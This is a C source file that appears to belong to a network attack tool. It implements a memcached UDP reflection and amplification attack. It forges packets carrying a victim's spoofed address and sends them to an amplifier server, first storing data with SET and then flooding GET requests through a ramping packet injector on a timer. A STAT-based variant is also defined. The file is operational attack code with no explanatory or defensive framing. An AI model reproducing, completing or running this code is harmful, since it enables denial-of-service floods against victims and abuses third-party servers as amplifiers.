
#include "venus.h"
#include "strix.h"
#include "memcachedforge.h"
#include "common/common.h"
#include "common/blacksmith.h"
#include "netuno/netuno.h"

#include "venus.h"
#define NOSIGNAL  0
#define SIGNAL_STOP 1
#define SIGNAL_ERROR 2

#define GetPort( port ) ( port > 0 ) ? port : MEMCACHED_DEFAULT_PORT

static AttackPlan * createAttackDataGETSET( AttackDraft *draft )
{
  AttackPlan *newData;
  int arg;

  memalloc( (void *)&newData, sizeof( AttackPlan ) );
  arg = MEMCACHED_SET;
  newData->setPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedText, &arg );
  arg = MEMCACHED_GET;
  newData->getPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedText, &arg );
  newData->initialThroughput = draft->initialThroughput;
  newData->incrementAttack = draft->typeThroughput;
  newData->timer = draft->timer;

  return newData;
}

static AttackPlan * createAttackDataSTAT( AttackDraft *draft )
{
  AttackPlan *newData;
  int arg;

  memalloc( (void *)&newData, sizeof( AttackPlan ) );
  arg = MEMCACHED_STAT;
  newData->setPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedBinary, &arg );
  newData->getPacket = ForgeUDP( draft->amp_ip, draft->target_ip, GetPort(draft->amp_port), ForgeMemcachedText, &arg );
  newData->initialThroughput = draft->initialThroughput;
  newData->incrementAttack = draft->typeThroughput;
  newData->timer = draft->timer;

  return newData;
}

void prepareServerWithData( Packet *p_pkt )
{
    if( SendPacket(p_pkt) < 0 )
    {
        Efatal(ERROR_MEMCACHED, "error memcached\n");
    }


}

void executeAttack( AttackPlan * atkData )
{
  
    if( SendPacket(atkData->setPacket) < 0 )
    {
        Efatal(ERROR_MEMCACHED, "error memcached\n");
    } 
    StartNetunoInjector( atkData->getPacket, atkData->initialThroughput, atkData->timer, atkData->incrementAttack);
  
}

int  ExecuteMemcachedMirror( void *draft )
{
    AttackPlan *plan;
    plan = createAttackDataGETSET( draft );
    executeAttack(plan);
    return 0;
}


